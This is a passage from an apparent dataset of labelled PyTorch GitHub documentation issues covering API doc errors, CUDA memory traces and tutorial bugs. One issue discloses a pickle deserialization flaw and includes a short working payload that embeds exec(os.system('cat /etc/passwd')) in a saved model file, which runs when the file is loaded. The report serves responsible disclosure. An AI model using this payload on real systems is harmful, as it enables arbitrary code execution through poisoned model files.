requires_grad=True):`)\r\n\r\n## References\r\n\r\n* [PEP 484 Type Hints - Arbitrary argument lists and default argument values](https://www.python.org/dev/peps/pep-0484/#arbitrary-argument-lists-and-default-argument-values)"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nWhen trying to use the torch.conj example of the documentation, this raise a RuntimeError : could not infer dtype of complex.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Launch a python shell\r\n2. Run ```import torch; torch.conj(torch.tensor([-1 + 1j, -2 + 2j, 3 - 3j]))```\r\n\r\nExample trace : \r\n```Python 3.7.3 (default, Mar 27 2019, 22:11:17) \r\n[GCC 7.3.0] :: Anaconda, Inc. on linux\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> import torch\r\n>>> torch.conj\r\n<built-in method conj of type object at 0x7f0bd05621e0>\r\n>>> torch.conj(torch.tensor([-1 + 1j, -2 + 2j, 3 - 3j]))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nRuntimeError: Could not infer dtype of complex \r\n```\r\n\r\n## Expected behavior\r\n\r\nThe documentation line should work as is, or the error message should be a little more specific.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.4.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: CentOS Linux release 7.7.1908 (Core)\r\nGCC version: (Homebrew gcc 5.5.0_4) 5.5.0\r\nCMake version: version 3.13.0\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: \r\nGPU 0: Tesla P100-SXM2-16GB\r\nGPU 1: Tesla P100-SXM2-16GB\r\nGPU 2: Tesla P100-SXM2-16GB\r\nGPU 3: Tesla P100-SXM2-16GB\r\n\r\nNvidia driver version: 440.33.01\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                intel_243    intel\r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py37ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py37hd6b4f25_0  \r\n[conda] pytorch                   1.4.0           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n[conda] torchvision               0.5.0                py37_cu101    pytorch\r\n[conda] torchviz                  0.0.1                    pypi_0    pypi\n\ncc @ezyang"},{"labels":["documentation",null,null,null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\nIn the case of multiple occurrences of the maximum values, [numpy.argmax](https://docs.scipy.org/doc/numpy/reference/generated/numpy.argmax.html) returns the indices corresponding to the first occurrence. Though not specified in the documentation, [torch.argmax](https://pytorch.org/docs/stable/torch.html#torch.argmax) returns the last occurrence instead.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\n>>> import torch\r\n>>> a = torch.tensor([0, 1, 1, 1])\r\n>>> print(a.argmax())\r\ntensor(3)\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\nAlign the behaviors of `PyTorch` with `NumPy`, or explicitly state the differences in the documentation to avoid confusion. \r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): 1.4.0\r\n - OS (e.g., Linux): Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.7\r\n - CUDA/cuDNN version: 10.1\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\n\ncc @ngimel"},{"labels":["documentation",null],"text":"## üêõ Bug\r\nNot so much a \"bug\" per se.  We are stopping the regular execution of daily builds using Python 2.7 on the Power (ppc64le) platform, for both CPU and GPU builds.  \r\nAs such, we wish to remove the build status for these two scenarios from the build table shown\r\nin the main README.md file.  That is the only change here.\r\n\r\nWorth noting:  We'll still have the capability to run a py27 build on request, if or as needed.  We\r\nsimply aren't going to maintain this as a regular build and wish to no longer have the status\r\npublicized.  The Python 3.6 builds will remain and will be the primary focus.\r\n\r\n## To Reproduce\r\n          N/A\r\n## Expected behavior\r\n          N/A\r\n## Environment\r\n          Power platform, Python 2.7 builds.\r\n\r\nI will take care of submitting a pull request for this."},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nHi so i was looking at the pytorch Documentation for torchvision.transforms at https://pytorch.org/docs/stable/torchvision/transforms.html\r\nI found this typo .\r\n![image](https://user-images.githubusercontent.com/44923912/72512376-e1c57580-3843-11ea-897c-bd64eb7b5998.png)\r\n\r\nLooking at the highlighted part of the test it states\r\ninput[channel] = (input[channel] - mean[channel]) / std[channel]\r\nbut it should be \r\nOutput[channel] = (input[channel] - mean[channel]) / std[channel]\r\n\r\nas i understand .\r\n\n\ncc @fmassa"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nI found that neither https://pytorch.org/docs/master/nn.functional.html#torch.nn.functional.kl_div\r\n\r\nnor https://pytorch.org/docs/master/nn.html#torch.nn.KLDivLoss provide a formula of kl divergence to indicate what is the relationship of input, target and P, Q in wikipedia reference.\r\n\r\nThe kl_div(input, target) is actually D(target, input) as mentioned in https://discuss.pytorch.org/t/custom-loss-kl-divergence-error/19850/4?u=thyrixyang\r\n\r\nAlthough in wikipedia it said D(p, q) is distance **of Q from P**, which suggests P should be the target, I think there should be a formula to make it clear. Otherwise, someone not very familiar with kl divergence like me may easily think kl_div(input, target)=D(input, target).\r\n"},{"labels":["documentation",null],"text":"See https://github.com/pytorch/pytorch/pull/27361\r\n\r\nThis uses DeprecationWarnings, but we usually use UserWarnings because many python versions filter DeprecationWarnings by default, making them pretty much useless."},{"labels":[null,"documentation",null],"text":"This is based on https://github.com/pytorch/pytorch/issues/31497 (after the last messages with @albanD and @ezyang)\r\n\r\nCondensed, I had a script there that printed:\r\n```python\r\nprint('memory_allocated', torch.cuda.memory_allocated() / 1e9, 'memory_cached', torch.cuda.memory_cached() / 1e9)\r\n```\r\nin a model eval loop. And at some point it got an OOM:\r\n```\r\nmemory_allocated 9.7478528 memory_cached 22.013804544\r\nmemory_allocated 11.03991552 memory_cached 24.29550592\r\n\r\nRuntimeError: CUDA out of memory. Tried to allocate 152.00 MiB (GPU 0; 31.72 GiB total capacity; 24.89 GiB already allocated; 6.12 MiB free; 30.70 GiB reserved in total by PyTorch)\r\n```\r\n\r\nSome things:\r\n1. `torch.cuda.memory_allocated()` of 11Gb is not reported in OOM message\r\n\r\n2. Terminology discrepancy: `torch.cuda.memory_cached` seems to be equivalent to \"already allocated\" from OOM message. In presence of also existing `torch.cuda.memory_allocated` this is confusing. Probably the OOM message should also say `cached`. Otherwise, it's pretty easy to mix up allocated, cached, reserved.\r\n\r\n3. It would be nice for the OOM message to include by default a small glossary/explainer explaining all these various memory counters.\r\n\r\nRelated: my previous issue about feature request of adding by default some measure of fragmentation: https://github.com/pytorch/pytorch/issues/29554, my old issue about allocator stats https://github.com/pytorch/pytorch/issues/1529.\r\n\r\nRecently there were a few reports of default allocator causing problems with very varying batch sizes (myself included). To confirm the guess, it would be nice to have an easily interpretable allocator state visualization / dump (super cool would be to have a way to dump an HTML vis). Currently there exists `torch.cuda.memory_stats`, `torch.cuda.memory_usage` and `torch.cuda.memory_snapshot`. It would be nice to have some default advice on what to save / use when debugging for suspected fragmentation.\r\n\r\nIn addition, they are not searchable for whatever reason: https://pytorch.org/docs/master/search.html?q=memory_usage&check_keywords=yes&area=default#\n\ncc @ngimel"},{"labels":["documentation",null],"text":"The Jenkins [readme.md](https://github.com/pytorch/pytorch/blob/master/.jenkins/pytorch/README.md) contains the broken link `https://github.com/pietern/pytorch-dockerfiles/blob/master/build.sh`. This repository has been moved on 11/11/2019, and it looks like the link should be replaced with `https://github.com/pytorch/pytorch-ci-dockerfiles/blob/master/build.sh`.\r\n\r\nEdit: It looks like I was looking in the wrong place. The CI dockerfiles are also included in a [subdirectory](https://github.com/pytorch/pytorch/tree/master/.circleci). I'm not sure where the link is intended to be pointing, however."},{"labels":[null,null,null,"documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=torch.no_grad&check_keywords=yes&area=default\r\n\r\nhttps://pytorch.org/docs/master/autograd.html?highlight=torch%20no_grad#torch.autograd.no_grad\r\n\r\nThe docs describe the usage of `torch.no_grad()` to create the context manager but they are filed under class `torch.autograd.no_grad`\r\n\r\nIt would be nice to have docs for `torch.no_grad` as well. User may well want to search for it when reading some source code. It'd also be nice to draw users' extra attention to the fact that parenthesis must be used after the `@torch.no_grad()` versus e.g. `@staticmethod` (which goes without parens)\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":[null,null,"documentation",null,null],"text":"I was attempting to run https://pytorch.org/tutorials/advanced/cpp_frontend.html on master but it didn't work, because the cmake is out of date: it needed to be `CXX_STANDARD 14` now that we are C++14.\r\n\r\nThis should have been caught in CI for the change that made us C++14. The problem is that we are not running the tutorial examples in CI. We should do so.\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null],"text":"Hello,\r\n\r\nI am trying to train with 4 V100 GPU. What I have observe is that when the multiplication of batch size with number of workers exceeds some limit, I get the following error below. I cannot understand what is the limiting fact. One reason can be the RAM size because the system gives me a warning that swap + memory has exceeds the limits at least one even if the code does not stop because of the error specified below. Or is it the memory limit in GPU? Thanx in advance for your help. \r\n\r\nI am using,\r\nTorch 1.1.0,\r\nCuda9.0\r\n\r\nIf you need further package details, I can provide. \r\nThanx in advance\r\n\r\nTraceback (most recent call last):\r\n  File \"two_stream_bert.py\", line 713, in <module>\r\n    main()\r\n  File \"two_stream_bert.py\", line 297, in main\r\n    train(train_loader, model, criterion,criterion2, optimizer, epoch,setMseCoeff,modality)\r\n  File \"two_stream_bert.py\", line 451, in train\r\n    output, input_vectors, sequenceOut, maskSample = model(inputs)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 493, in __call__\r\n    result = self.forward(*input, **kwargs)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/data_parallel.py\", line 148, in forward\r\n    inputs, kwargs = self.scatter(inputs, kwargs, self.device_ids)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/data_parallel.py\", line 159, in scatter\r\n    return scatter_kwargs(inputs, kwargs, device_ids, dim=self.dim)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 35, in scatter_kwargs\r\n    inputs = scatter(inputs, target_gpus, dim) if inputs else []\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 28, in scatter\r\n    return scatter_map(inputs)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 15, in scatter_map\r\n    return list(zip(*map(scatter_map, obj)))\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 13, in scatter_map\r\n    return Scatter.apply(target_gpus, None, dim, obj)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/_functions.py\", line 89, in forward\r\n    outputs = comm.scatter(input, target_gpus, chunk_sizes, ctx.dim, streams)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/cuda/comm.py\", line 147, in scatter\r\n    return tuple(torch._C._scatter(tensor, devices, chunk_sizes, dim, streams))\r\nRuntimeError: CUDA error: out of memory (malloc at /pytorch/c10/cuda/CUDACachingAllocator.cpp:241)\r\nframe #0: std::function<std::string ()>::operator()() const + 0x11 (0x2ad6b175f441 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10.so)\r\nframe #1: c10::Error::Error(c10::SourceLocation, std::string const&) + 0x2a (0x2ad6b175ed7a in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10.so)\r\nframe #2: <unknown function> + 0x1581d (0x2ad6b381481d in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10_cuda.so)\r\nframe #3: <unknown function> + 0x16247 (0x2ad6b3815247 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10_cuda.so)\r\nframe #4: at::native::empty_cuda(c10::ArrayRef<long>, c10::TensorOptions const&) + 0x121 (0x2ad674e42f81 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2_gpu.so)\r\nframe #5: at::CUDAType::empty(c10::ArrayRef<long>, c10::TensorOptions const&) const + 0x19b (0x2ad673a8a6fb in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2_gpu.so)\r\nframe #6: torch::autograd::VariableType::empty(c10::ArrayRef<long>, c10::TensorOptions const&) const + 0x284 (0x2ad6b2522094 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch.so.1)\r\nframe #7: at::native::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) + 0x506 (0x2ad6a7b67666 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2.so)\r\nframe #8: at::TypeDefault::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x17 (0x2ad6a7de6857 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2.so)\r\nframe #9: torch::autograd::VariableType::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x2c2 (0x2ad6b240bb52 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch.so.1)\r\nframe #10: torch::cuda::scatter(at::Tensor const&, c10::ArrayRef<long>, c10::optional<std::vector<long, std::allocator<long> > > const&, long, c10::optional<std::vector<c10::optional<c10::cuda::CUDAStream>, std::allocator<c10::optional<c10::cuda::CUDAStream> > > > const&) + 0x389 (0x2ad6b295ffd9 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch.so.1)\r\nframe #11: <unknown function> + 0x5a27bf (0x2ad6720a27bf in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch_python.so)\r\nframe #12: <unknown function> + 0x130cfc (0x2ad671c30cfc in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch_python.so)\r\nframe #13: _PyCFunction_FastCallDict + 0x154 (0x2ad6591c0b94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #14: <unknown function> + 0x19e67c (0x2ad65925067c in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #15: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #16: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #17: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #18: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #19: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #20: PyEval_EvalCodeEx + 0x329 (0x2ad65924b459 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #21: <unknown function> + 0x19a264 (0x2ad65924c264 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #22: PyObject_Call + 0x3e (0x2ad6591c099e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #23: THPFunction_apply(_object*, _object*) + 0x6b1 (0x2ad671eb3481 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch_python.so)\r\nframe #24: _PyCFunction_FastCallDict + 0x91 (0x2ad6591c0ad1 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #25: <unknown function> + 0x19e67c (0x2ad65925067c in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #26: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #27: <unknown function> + 0x197dae (0x2ad659249dae in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #28: _PyFunction_FastCallDict + 0x1bb (0x2ad65924ae1b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #29: _PyObject_FastCallDict + 0x26f (0x2ad6591c0f5f in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #30: <unknown function> + 0x12a552 (0x2ad6591dc552 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #31: PyIter_Next + 0xe (0x2ad659205c9e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #32: PySequence_Tuple + 0xf9 (0x2ad65920aad9 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #33: _PyEval_EvalFrameDefault + 0x563a (0x2ad659277ffa in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #34: <unknown function> + 0x197dae (0x2ad659249dae in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #35: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #36: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #37: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #38: <unknown function> + 0x197dae (0x2ad659249dae in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #39: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #40: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #41: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #42: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #43: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #44: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #45: _PyEval_EvalFrameDefault + 0x10ba (0x2ad659273a7a in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #46: <unknown function> + 0x19870b (0x2ad65924a70b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #47: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #48: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #49: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #50: _PyFunction_FastCallDict + 0x3db (0x2ad65924b03b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #51: _PyObject_FastCallDict + 0x26f (0x2ad6591c0f5f in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #52: _PyObject_Call_Prepend + 0x63 (0x2ad6591c5a03 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #53: PyObject_Call + 0x3e (0x2ad6591c099e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #54: _PyEval_EvalFrameDefault + 0x1ab0 (0x2ad659274470 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #55: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #56: _PyFunction_FastCallDict + 0x1bb (0x2ad65924ae1b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #57: _PyObject_FastCallDict + 0x26f (0x2ad6591c0f5f in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #58: _PyObject_Call_Prepend + 0x63 (0x2ad6591c5a03 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #59: PyObject_Call + 0x3e (0x2ad6591c099e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #60: <unknown function> + 0x16b9b7 (0x2ad65921d9b7 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #61: _PyObject_FastCallDict + 0x8b (0x2ad6591c0d7b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #62: <unknown function> + 0x19e7ce (0x2ad6592507ce in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #63: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\n\n\ncc @ngimel"},{"labels":["documentation",null],"text":"The idea is supposed to be to recursively reset the parameters of all the modules (Linear, Conv etc) in the current module (the main network i.e. a CNN).\r\n\r\nThat way reseting the parameters would be a one-liner and autograd and the optimizer would still track the right arrays (when checking for 'id(parameterxyz)'.\r\n\r\nI am aware that one can use the 'apply()' function but I thought this might be a bug.\r\n```\r\nfrom torch.nn import Sequential, Conv2d, ConvTranspose2d, LayerNorm, Linear, BatchNorm1d, MaxPool2d\r\n\r\nclass CNN(torch.nn.Module):\r\n\tdef __init__(self):\r\n\t\tsuper(CNN, self).__init__()\r\n\r\n\t\tself.conv1          = Conv2d(1, 32, kernel_size=5)\r\n\t\tself.pool           = MaxPool2d(2, 2)\r\n\t\tself.conv2          = Conv2d(32, 32, kernel_size=5)\r\n\t\tself.fc1            = Linear(512, 256)\r\n\t\tself.fc2            = Linear(256, 10)\r\n\r\n       def reset_parameters(self):\r\n\t\tfor module in self.modules():\r\n\t\t\tmodule.reset_parameters()\r\n\r\n\tdef forward(self, x):\r\n\t\tx = self.pool(F.relu(self.conv1(x)))\r\n\t\tx = self.pool(F.relu(self.conv2(x)))\r\n\t\tx = x.view(x.size(0), -1)\r\n\t\tx = F.relu(self.fc1(x))\r\n\t\tx = self.fc2(x)\r\n\t\treturn x\r\n\r\nmodel = CNN()\r\nmodel.reset_parameters()\r\n```\r\n\r\n - PyTorch Version : 1.3.1\r\n - OS (e.g., Linux): Mac\r\n\r\nPS: Sorry for the format ... somehow I'm not succeeding at making the code format work\r\n(EDIT: fixed)\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nPyTorch serialization mechanisms are built upon the `pickle` library that is [known to be insecure](https://docs.python.org/3/library/pickle.html) when dealing with third-party data.\r\nIt concerns both the saved model parameters and the entire model saving (which are considered to be the [best practices](https://pytorch.org/docs/stable/notes/serialization.html))\r\n\r\n### Example script, that infects any existing model:\r\n\r\n```python\r\nimport torch\r\nimport pickle\r\n\r\nON_REDUCE = \"\"\"\r\nglobal MAGIC_NUMBER\r\nMAGIC_NUMBER = None\r\nimport os;os.system('cat /etc/passwd')\r\n\"\"\"\r\n\r\nclass Payload:\r\n    def __reduce__(self):\r\n        return (exec, (ON_REDUCE,))\r\n\r\nmodel = torch.load('inception_v3_google-1a9a5a14.pth')\r\ntorch.serialization.MAGIC_NUMBER = Payload()\r\ntorch.save(model, 'evil.pth')\r\n```\r\n\r\nThen, if any user will download an infected model and execute `torch.load('evil.pth')` the arbitrary command will be executed on his device. That is also relevant to [torch.hub.load](https://pytorch.org/docs/stable/hub.html#torch.hub.load), which will download and deserialize the model itself.\r\n\r\n### Small demo:\r\n![image](https://user-images.githubusercontent.com/23273750/71783559-11da7080-301b-11ea-8860-16ac30f0bdf6.png)\r\n\r\n### Proposed solution\r\nAs an easy solution you may consider adding a warning in a [documentation](https://pytorch.org/docs/stable/notes/serialization.html), that warns the users of using untrusted models\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null,null,null],"text":"## üìö Documentation\r\n \r\nDocumentation for `scatter_` and `scatter_add_` incorrectly states that \"Moreover, as for gather(), the values of index must be between 0 and self.size(dim) - 1 inclusive, and all values in a row along the specified dimension dim must be unique.\"\r\nhttps://pytorch.org/docs/stable/tensors.html?highlight=scatter_add#torch.Tensor.scatter_\r\nThere is no requirement for elements to be unique in either of 3 functions (`scatter_`, `scatter_add_`, `gather`), and `gather` documentation correctly does not mention that requirement.\r\nIn case of `scatter_`, there is no guarantees of which value from the source with the same indices ends up being written to `self`, in case of `scatter_add_` values from the source with the same indices are accumulated. \r\nThere is a broader issue aside from the documentation here, because depending on whether indices are unique or repeating, parallel implementation for `scatter_add_` can be different (`scatter` is fine although can be non-deterministic). Maybe we should allow users to indicate if their indices are unique, so that we can choose more efficient implementation. The implementation variants are\r\n1) indices are guaranteed to be unique - any naive implementation writing values from src to self will work, parallelization is easy\r\n2) non-unique indices, but we are fine with non-deterministic behavior - we can use atomic accumulation in this case, and still do efficient parallelization\r\n3) non-unique indices, and we want deterministic results - some more sophisticated algorithms required, handling accumulation for repeating indices (e.g. pre-sorting indices)\r\nCurrently we have 2) for cuda implementation and no parallelization for CPU, afaikt.\r\nSetting \"triage review\" label to discuss desired behavior.\r\ncc @ezyang @SsnL @gchanan @nikitaved\r\n"},{"labels":["documentation",null,null],"text":"There is no description of torch.constant_pad_nd in the document. What is the specific function of this interface? I tried to read the source code of atenÔºàaten/src/ATen/native/ConstantPadNd.cppÔºâ, but it was a little difficult for me hh.\r\n```\r\nimport torch\r\na = torch.randn(4)\r\ntorch.constant_pad_nd(a, [1, 2], 0.5)\r\n```\r\n"},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/master/onnx.html?highlight=export#torch.onnx.export\r\n![image](https://user-images.githubusercontent.com/1041752/71543968-89ecca80-2979-11ea-8bbc-366b6e5c556c.png)\r\n\n\ncc @ezyang @zou3519"},{"labels":[null,"documentation",null],"text":"There is no description of torch.poisson in the document. What is the specific function of this interface?\r\n```\r\nimport torch\r\na = torch.randn(4)\r\ntorch.poisson(a)\r\n```\r\n\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n### Some Question\r\nwhen I try some math operations, like torch.std, keepdim is not its 3rd parameter, but torch.mean is. That make me confusion.\r\n```python\r\na = torch.randn(3, 3, 3)\r\ntorch.mean(a, (1, 2), True)\r\n# tensor([[[-0.2389]], \r\n#           [[-0.3910]],\r\n#           [[ 0.2703]]])\r\ntorch.std(a, (1, 2), True)\r\n# tensor([1.4173, 0.9174, 1.1403])\r\n```\r\n\r\n### Another type wrong\r\nin doc, the second item of torch.std_mean, that is torch.std(input, dim, keepdim=False, unbiased=True)\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/stable/tensors.html#torch.Tensor.scatter\r\n> `scatter(dim, index, source)` ‚Üí Tensor\r\n\r\nThe argument name is `src`, not `source`. `source` will cause an error in the current Pytorch version, and `src` will cause an error in older versions."},{"labels":[null,null,"documentation",null],"text":"Current, [Our Own Ring-Allreduce](https://pytorch.org/tutorials/intermediate/dist_tuto.html#our-own-ring-allreduce) example is not correct. It will NOT perform all reduce on selected tensors. The code to reproduce is attached below\r\n\r\n ```python\r\n\"\"\" Implementation of a ring-reduce with addition. \"\"\"\r\ndef allreduce(send, recv):\r\n    rank = dist.get_rank()\r\n    size = dist.get_world_size()\r\n    send_buff = th.zeros(send.size())\r\n    recv_buff = th.zeros(send.size())\r\n    accum = th.zeros(send.size())\r\n    accum[:] = send[:]\r\n\r\n    left = ((rank - 1) + size) % size\r\n    right = (rank + 1) % size\r\n\r\n    for i in range(size - 1):\r\n        if i % 2 == 0:\r\n            # Send send_buff\r\n            send_req = dist.isend(send_buff, right)\r\n            dist.recv(recv_buff, left)\r\n            accum[:] += recv[:]\r\n        else:\r\n            # Send recv_buff\r\n            send_req = dist.isend(recv_buff, right)\r\n            dist.recv(send_buff, left)\r\n            accum[:] += send[:]\r\n        send_req.wait()\r\n    recv[:] = accum[:]\r\n\r\ndef run_allreduce(rank, size):\r\n    data = torch.ones(3)  * (rank + 1)    \r\n    recv = torch.zeros_like(a)\r\n    allreduce(send=data, 